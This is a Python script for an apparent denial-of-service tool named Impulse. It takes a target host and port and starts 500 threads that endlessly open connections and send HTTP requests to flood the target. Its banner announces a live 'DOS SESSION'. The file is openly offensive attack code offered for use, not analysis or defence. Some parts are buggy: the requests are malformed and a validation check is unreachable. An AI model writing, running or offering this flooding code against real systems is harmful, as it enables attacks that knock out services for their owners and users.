import socket
import time
import threading
import sys
import os
from progress.spinner import Spinner 



os.system('cls')
ss = 0
iip = "123.432.34.5"
ip = "s"
a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def banner():
    print('''\u001b[94m
                               
                        ██ ███    ███ ██████  ██    ██ ██      ███████ ███████ 
                        ██ ████  ████ ██   ██ ██    ██ ██      ██      ██      
                        ██ ██ ████ ██ ██████  ██    ██ ██      ███████ █████   
                        ██ ██  ██  ██ ██      ██    ██ ██           ██ ██      
                        ██ ██      ██ ██       ██████  ███████ ███████ ███████ 
                                                               \u001b[93m  version 1.2.5 \u001b[0m
                                            
                                          \u001b[32m Developed by:\u001b[31m'THE P0intMaN'\u001b[0m
                                                       

                       \u001b[34mTo know more about Impulse, visit www.github.com/P0intMaN/Impulse\u001b[0m

\u001b[91m //---//\u001b[96m   You can find open ports using \u001b[92m Pelican Port Scanner\u001b[96m  ---> www.github.com/P0intMaN/Pelican\u001b[91m  //---//\u001b[0m
    ''')


def error():
    print("\u001b[91m\nInavlid Input!! SHUTTING DOWN INTERFACE...\u001b[0m")
    time.sleep(3)
    sys.exit(1)


banner()
print("\u001b[93m\n\n------ INITAILSING IMPULSE INTERFACE ------\u001b[0m")
time.sleep(4)


choice = int(input("\u001b[92m\nEnter the Choice of Input => \u001b[94m1. Website  ||  2. IP Address of Website\u001b[92m --> \u001b[0m"))
if choice == 1 :
    try:
        name = input("\u001b[92m\nEnter the Website address --> \u001b[0m")
        ip = socket.gethostbyname(name)
        port = int(input("\u001b[92mEnter the port to be \u001b[94mIMPULSED \u001b[0m\u001b[91m(Default usage: port 80)\u001b[92m -->\u001b[0m "))
        if a.connect((ip,port)) !=0:
            ss = 1

    except:
        print("\u001b[91m INVALID ENTRY!\u001b[0m ")
        sys.exit(1)     

if choice == 2:
    try:
        ip = input('\n\u001b[92mEnter the target IP Address -->\u001b[0m  ')
        port = int(input("\u001b[92mEnter the port to be \u001b[94mIMPULSED \u001b[91m(Default usage: port 80)\u001b[92m -->\u001b[0m "))
        if a.connect((ip,port)) !=0:
            ss = 1
    except:
        print("\u001b[91m INVALID ENTRY!\u001b[0m ")
        sys.exit(1)             
if choice > 2:
    error()


def autoddos():
    
    mylist = {1,2,3,4,5,6,7,8,9,23,34,56,674,5312,45,4,534,4,45,75,76,57,45,46}     
    print("\n\n\u001b[91m------ DOS SESSION IS LIVE! [\u001b[0m NOW THERE IS NO LOOKING BACK :)\u001b[91m ] ------\u001b[0m " )        
    spin = Spinner('', max = mylist )
    for mylists in mylist:
        spin.next()
        time.sleep(0.3)

    print(" \n\u001b[93m------ YOU CAN TERMINATE DOSING BY EXITING IMPULSE ------\u001b[0m")
    time.sleep(4)

def ddos():
    while True:
        a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        a.connect((ip, port))
        a.sendto(('GET/' + ip + "HTTP/1.1\r\n").encode('ascii'), (ip, port))
        a.sendto(('HOST: ' + iip + "\r\n\r\n").encode('ascii'), (ip, port))
        a.close()
        print("\u001b[94mDOSING -- PACKETS SUCCESSFULLY SENT...\u001b[0m")


    checkresult = os.system('ping -n 4 {}'.format(ip))
    if checkresult == 0:
        print("\n\u001b[91mYour Input is Valid! Redirecting to the Interface...\u001b[0m")
        time.sleep(3)
    else:
        error()
    
       
autoddos()
for i in range(500):
    thread = threading.Thread(target= ddos)
    thread.start()
